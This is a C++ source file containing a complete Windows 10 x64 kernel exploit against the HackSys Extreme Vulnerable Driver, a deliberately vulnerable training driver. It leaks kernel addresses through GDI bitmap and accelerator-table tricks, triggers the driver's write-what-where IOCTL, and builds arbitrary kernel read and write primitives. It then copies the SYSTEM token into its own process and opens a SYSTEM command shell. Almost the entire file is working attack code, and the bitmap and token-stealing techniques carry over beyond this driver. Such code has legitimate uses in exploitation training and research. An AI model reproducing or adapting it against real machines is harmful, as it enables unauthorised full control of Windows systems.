// tmp_del.cpp : Defines the entry point for the console application.
//

#include "windows.h"
#include "stdio.h"
#include "nt.h"
#include "sddl.h"

typedef struct _hTable {
	HANDLE						BitmapHandle;
	USER_HANDLE_ENTRY		    phead;
} hTable, *PhTable;

PUSER_HANDLE_ENTRY GetEntyFromHandle(LPVOID handle)
{
	PUSER_HANDLE_ENTRY addr = 0;
	PSHAREDINFO pSharedInfo = (PSHAREDINFO)GetProcAddress(GetModuleHandleW(L"USER32.dll"), "gSharedInfo");
	PUSER_HANDLE_ENTRY gHandleTable = pSharedInfo->aheList;
	DWORD index = LOWORD(handle);
	__try {
		addr = &gHandleTable[index];
	}
	__except (wprintf(L"Error!\n"), EXCEPTION_EXECUTE_HANDLER)
	{
		wprintf(L"Error");
	}
	return addr;
}


hTable AccelGDIHelper()
{
	int count = 20;
	hTable hnret;
	hnret.BitmapHandle = NULL;
	LPVOID buff;
	DWORD64 hm[20];
	LPCWSTR User32String = L"user32.dll";
	LPVOID lpvPayload = VirtualAlloc(
		NULL,				        // Next page to commit
		10000,		                // Page size, in bytes
		MEM_COMMIT | MEM_RESERVE,	// Allocate a committed page
		PAGE_EXECUTE_READWRITE);	// Read/write access

	for (int i = 0; i < count; i++)
	{
		HACCEL AccelHandle = CreateAcceleratorTable((LPACCEL)lpvPayload, 700);
		PUSER_HANDLE_ENTRY hEntry = GetEntyFromHandle(AccelHandle);
		hm[i] = (DWORD64)hEntry->pKernel; // change to dword so we chan easily match
		if (hm[i - 1] == hm[i])
		{
			hnret.phead = *hEntry;
			DestroyAcceleratorTable(AccelHandle);
			buff = VirtualAlloc(
				NULL,				        // Next page to commit
				0x50 * 2 * 4,		        // Page size, in bytes
				MEM_COMMIT | MEM_RESERVE,	// Allocate a committed page
				PAGE_EXECUTE_READWRITE);	// Read/write access 0x50 * 2 * 4
			HBITMAP BitmapHandle = CreateBitmap(0x701, 2, 1, 8, buff);
			hnret.BitmapHandle = BitmapHandle;

			return hnret;
		}
		DestroyAcceleratorTable(AccelHandle);
	}
	return hnret; // should never
}

HANDLE GetHacksysDriverHandle()
{
	LPCWSTR lpDeviceName = L"\\\\.\\HacksysExtremeVulnerableDriver";
	HANDLE hDevice = CreateFileW(lpDeviceName,		  // Name of the write
		GENERIC_READ | GENERIC_WRITE,				  // Open for reading/writing
		FILE_SHARE_WRITE,							  // Allow Share
		NULL,										  // Default security
		OPEN_EXISTING,								  // Opens a file or device, only if it exists.
		FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL, // Normal file
		NULL);										  // No attr. template
	if (hDevice == INVALID_HANDLE_VALUE)
	{
		wprintf(L" -> Unable to get Driver handle!\n");
		//exit(1);
	}
	wprintf(L" [+] Our Device Handle:            = 0x%p \n", hDevice);
	return hDevice;
}


PPEB GetProcessPEB()
{
	PPEB peb;
	PROCESS_BASIC_INFORMATION pbi;
	// odd that GetProcAddressW is not a function isn't it?
	_NtQueryInformationProcess NtQueryInformationProcess = (_NtQueryInformationProcess)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQueryInformationProcess");
	DWORD dwPID = GetCurrentProcessId();
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, dwPID);
	if (hProcess == INVALID_HANDLE_VALUE)
	{
		wprintf(L" -> Unable to get Process handle!\n");
		exit(1);
	}
	// Retrieves information about the specified process.
	NtQueryInformationProcess(hProcess, 0, &pbi, sizeof(pbi), NULL);
	// Read pbi.PebBaseAddress into PEB Structure
	if (!ReadProcessMemory(hProcess, &pbi.PebBaseAddress, &peb, sizeof(peb), NULL)) {
		wprintf(L" -> Unable to read Process Memory!\n");
		CloseHandle(hProcess);
		exit(1);
	}
	CloseHandle(hProcess); //cleanup
	wprintf(L" [+] PEB Address is at:            = 0x%p \n", (LPVOID)peb);
	return peb;
}


BOOL IsSystem()
{
	DWORD dwSize = 0, dwResult = 0;
	HANDLE hToken = NULL;
	PTOKEN_USER Ptoken_User;
	LPWSTR SID = NULL;
	// Open a handle to the access token for the calling process.
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
	{
		return FALSE;
	}
	// Call GetTokenInformation to get the buffer size.
	if (!GetTokenInformation(hToken, TokenUser, NULL, dwSize, &dwSize))
	{
		dwResult = GetLastError();
		if (dwResult != ERROR_INSUFFICIENT_BUFFER)
		{
			return FALSE;
		}
	}
	// Allocate the buffer.
	Ptoken_User = (PTOKEN_USER)GlobalAlloc(GPTR, dwSize);
	// Call GetTokenInformation again to get the group information.
	if (!GetTokenInformation(hToken, TokenUser, Ptoken_User, dwSize, &dwSize)) {
		return FALSE;
	}
	if (!ConvertSidToStringSidW(Ptoken_User->User.Sid, &SID)) {
		return FALSE;
	}
	if (_wcsicmp(L"S-1-5-18", SID) != 0) {
		return FALSE;
	}
	if (Ptoken_User) GlobalFree(Ptoken_User);
	return TRUE;
}


// WaitForSingleObject(pi.hProcess, INFINITE);
HANDLE PopShell()
{
	STARTUPINFOW si = { sizeof(STARTUPINFOW) };
	PROCESS_INFORMATION pi;
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));
	CreateProcessW(L"C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, 0, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
	return pi.hProcess;
}


LONG BitmapArbitraryRead(HBITMAP hManager, HBITMAP hWorker, LPVOID lpReadAddress, LPVOID lpReadResult, DWORD dwReadLen)
{
	SetBitmapBits(hManager, dwReadLen, &lpReadAddress);		// Set Workers pvScan0 to the Address we want to read. 
	return GetBitmapBits(hWorker, dwReadLen, lpReadResult); // Use Worker to Read result into lpReadResult Pointer.
}

LONG BitmapArbitraryWrite(HBITMAP hManager, HBITMAP hWorker, LPVOID lpWriteAddress, LPVOID lpWriteValue, DWORD dwWriteLen)
{
	SetBitmapBits(hManager, dwWriteLen, &lpWriteAddress);     // Set Workers pvScan0 to the Address we want to write.
	return SetBitmapBits(hWorker, dwWriteLen, &lpWriteValue); // Use Worker to Write at Arbitrary Kernel address.
}

//FARPROC fpFunctionAddress = KernelSymbolInfo("HalDispatchTable");
FARPROC WINAPI KernelSymbolInfo(LPCSTR lpSymbolName)
{
	DWORD len;
	PSYSTEM_MODULE_INFORMATION ModuleInfo;
	LPVOID kernelBase = NULL;
	PUCHAR kernelImage = NULL;
	HMODULE hUserSpaceKernel;
	LPCSTR lpKernelName = NULL;
	FARPROC pUserKernelSymbol = NULL;
	FARPROC pLiveFunctionAddress = NULL;

	_NtQuerySystemInformation NtQuerySystemInformation = (_NtQuerySystemInformation)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQuerySystemInformation");
	if (NtQuerySystemInformation == NULL) {
		return NULL;
	}

	NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &len);
	ModuleInfo = (PSYSTEM_MODULE_INFORMATION)VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!ModuleInfo)
	{
		return NULL;
	}
	NtQuerySystemInformation(SystemModuleInformation, ModuleInfo, len, &len);
	kernelBase = ModuleInfo->Module[0].ImageBase;
	kernelImage = ModuleInfo->Module[0].FullPathName;
	wprintf(L" [+] Kernel Base Address Location: = 0x%p\n", kernelBase);
	wprintf(L" [+] Kernel Full Image Name:       = %hs\n", kernelImage);
	/* Find exported Kernel Functions */
	lpKernelName = (LPCSTR)(ModuleInfo->Module[0].FullPathName + ModuleInfo->Module[0].OffsetToFileName);
	hUserSpaceKernel = LoadLibraryExA(lpKernelName, 0, 0);
	if (hUserSpaceKernel == NULL)
	{
		VirtualFree(ModuleInfo, 0, MEM_RELEASE);
		return NULL;
	}
	pUserKernelSymbol = GetProcAddress(hUserSpaceKernel, lpSymbolName);
	if (pUserKernelSymbol == NULL)
	{
		VirtualFree(ModuleInfo, 0, MEM_RELEASE);
		return NULL;
	}
	pLiveFunctionAddress = (FARPROC)((PUCHAR)pUserKernelSymbol - (PUCHAR)hUserSpaceKernel + (PUCHAR)kernelBase);
	FreeLibrary(hUserSpaceKernel);
	VirtualFree(ModuleInfo, 0, MEM_RELEASE);
	return pLiveFunctionAddress;
}


BOOL TokenGDIOverwrite(VersionSpecificConfig pgConfig, HBITMAP hManager, HBITMAP hWorker, DWORD dwPID)
{
	wprintf(L" [*] Looking up Kernel Function PsInitialSystemProcess:\n");
	LPCSTR lpFunctionName = "PsInitialSystemProcess";
	FARPROC fpFunctionAddress = NULL;
	fpFunctionAddress = KernelSymbolInfo(lpFunctionName);
	if (fpFunctionAddress == NULL)
	{
		wprintf(L" -> Unable to find memory address!\n");
		return 1;
	}
	wprintf(L" [+] PsInitialSystemProcess at     = 0x%p \n", (LPVOID)fpFunctionAddress);
	wprintf(L" [*] Reading System _EPROCESS structure");
	LPVOID lpSystemEPROCESS = NULL;
	LPVOID lpSysProcID = NULL;
	LIST_ENTRY leNextProcessLink;
	LPVOID lpSystemToken = NULL;

	BitmapArbitraryRead(hManager, hWorker, (LPVOID)fpFunctionAddress, &lpSystemEPROCESS, sizeof(LPVOID));
	BitmapArbitraryRead(hManager, hWorker, (PUCHAR)lpSystemEPROCESS + pgConfig.dwUniqueProcessIdOffset, &lpSysProcID, sizeof(LPVOID));
	BitmapArbitraryRead(hManager, hWorker, (PUCHAR)lpSystemEPROCESS + pgConfig.dwActiveProcessLinks, &leNextProcessLink, sizeof(LIST_ENTRY));
	BitmapArbitraryRead(hManager, hWorker, (PUCHAR)lpSystemEPROCESS + pgConfig.dwTokenOffset, &lpSystemToken, sizeof(LPVOID));

	DWORD dwSysProcID = LOWORD(lpSysProcID);

	wprintf(L" -> Done!\n");
	wprintf(L" [+] System _EPROCESS is at:       = 0x%p \n", lpSystemEPROCESS);
	wprintf(L" [+] System PID is:                = %u\n", dwSysProcID);
	wprintf(L" [+] System _LIST_ENTRY is at:     = 0x%p \n", leNextProcessLink.Flink);
	wprintf(L" [+] System Token is:              = 0x%p \n", lpSystemToken);
	wprintf(L"  -> Reading Current _EPROCESS structure");
	LPVOID lpNextEPROCESS = NULL;
	LPVOID lpCurrentPID = NULL;
	LPVOID lpCurrentToken = NULL;
	DWORD dwCurrentPID;
	while (TRUE) { 
		lpNextEPROCESS = (PUCHAR)leNextProcessLink.Flink - pgConfig.dwActiveProcessLinks;
		BitmapArbitraryRead(hManager, hWorker, (PUCHAR)lpNextEPROCESS + pgConfig.dwUniqueProcessIdOffset, &lpCurrentPID, sizeof(LPVOID));
		BitmapArbitraryRead(hManager, hWorker, (PUCHAR)lpNextEPROCESS + pgConfig.dwTokenOffset, &lpCurrentToken, sizeof(LPVOID));
		BitmapArbitraryRead(hManager, hWorker, (PUCHAR)lpNextEPROCESS + pgConfig.dwActiveProcessLinks, &leNextProcessLink, sizeof(LIST_ENTRY));
		dwCurrentPID = LOWORD(lpCurrentPID);
		if (dwCurrentPID == dwPID) break;
	}
	wprintf(L" -> Done!\n");
	wprintf(L" [+] Current _EPROCESS Structure:  = 0x%p \n", lpNextEPROCESS);
	wprintf(L" [+] Current Process ID is:        = %u \n", dwCurrentPID);
	wprintf(L" [+] Current _EPROCESS Token:      = 0x%p \n", (PUCHAR)lpNextEPROCESS + pgConfig.dwTokenOffset);
	wprintf(L" [+] Current Process Token is:     = 0x%p \n", lpCurrentToken);
	wprintf(L" -> Replace Current Token");
	BitmapArbitraryWrite(hManager, hWorker, (PUCHAR)lpNextEPROCESS + pgConfig.dwTokenOffset, lpSystemToken, sizeof(LPVOID));
	wprintf(L" -> Done!\n");
	return 0;
}


void ArbitraryOverwriteGDI(VersionSpecificConfig pgConfig)
{
	PUCHAR chOverwriteBuffer;
	LPVOID lpSourceTargetAddress = NULL;
	DWORD dwPID = GetCurrentProcessId();
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, dwPID);
	wprintf(L" [*] Reading Process PEB Address\n");
	PPEB peb = GetProcessPEB();
	hTable hWorkerTable = AccelGDIHelper();
	hTable hManagerTable = AccelGDIHelper();
	if (hWorkerTable.BitmapHandle == NULL || hManagerTable.BitmapHandle == NULL)
	{
		wprintf(L" -> Unable to find memory address with AcceleratorTable!\n");
		exit(1);
	}
	PUCHAR pManagerPvScan0 = (PUCHAR)hManagerTable.phead.pKernel + pgConfig.dwOffsetToPvScan0;
	wprintf(L" [+] hManager Kernel Location:     = 0x%p\n", (PUSER_HANDLE_ENTRY)hManagerTable.phead.pKernel);
	wprintf(L" [+] ManageBitmap Handle Location: = 0x%p \n", hManagerTable.BitmapHandle);
	wprintf(L" [+] ManageBitmappvScan0 Location: = 0x%p \n", pManagerPvScan0);
	PUCHAR pWorkerPvScan0 = (PUCHAR)hWorkerTable.phead.pKernel + pgConfig.dwOffsetToPvScan0;
	wprintf(L" [+] hWorker Kernel Location:      = 0x%p\n", (PUSER_HANDLE_ENTRY)hWorkerTable.phead.pKernel);
	wprintf(L" [+] WorkerBitmap Handle Location: = 0x%p \n", hWorkerTable.BitmapHandle);
	wprintf(L" [+] WorkerBitmappvScan0 Location: = 0x%p \n", pWorkerPvScan0);
	//
	HANDLE hDevice = GetHacksysDriverHandle();
	//
	wprintf(L"  -> Prepare our Arbitrary Overwrite Buffer\n");
	// Create a double Pointer to pWorkerPvScan0
	lpSourceTargetAddress = (LPVOID)malloc(sizeof(LPVOID));  // allocate
	lpSourceTargetAddress = &pWorkerPvScan0;                 // from pointer1
	chOverwriteBuffer = (PUCHAR)malloc(sizeof(LPVOID) * 2);  // allocate 2 pointers
	memcpy(chOverwriteBuffer, &lpSourceTargetAddress, (sizeof(LPVOID)));                    // Write WHAT
	memcpy(chOverwriteBuffer + (sizeof(LPVOID)), &pManagerPvScan0, (sizeof(LPVOID)));       // write WHERE
	wprintf(L" [+] Overwrite Buffer available:   = 0x%p \n", chOverwriteBuffer);
	DWORD junk = 0;                     // Discard results
	BOOL bResult = DeviceIoControl(hDevice,	// Device to be queried
		0x22200B,						// Operation to perform
		chOverwriteBuffer,				// Input Buffer		
		(sizeof(LPVOID) * 2),			// Buffer Size
		NULL, 0,						// Output Buffer
		&junk,							// # Bytes returned
		(LPOVERLAPPED)NULL);			// Synchronous I/O	

	TokenGDIOverwrite(pgConfig, (HBITMAP)hManagerTable.BitmapHandle, (HBITMAP)hWorkerTable.BitmapHandle, dwPID);
	BOOL isGodMode = IsSystem();
	if (!isGodMode) {
		wprintf(L" [!] Exploit Failed :( \n\n");
		exit(1);
	}
	PopShell();
	CloseHandle(hProcess);
	CloseHandle(hDevice);
}





int wmain()
{
	VersionSpecificConfig pgConfig;
	// 64bitWin10
	pgConfig.dwOffsetToPvScan0 = 0x50;
	pgConfig.dwUniqueProcessIdOffset = 0x2e8;
	pgConfig.dwTokenOffset = 0x358;
	pgConfig.dwActiveProcessLinks = 0x2f0;
	ArbitraryOverwriteGDI(pgConfig);
	return 0;
}
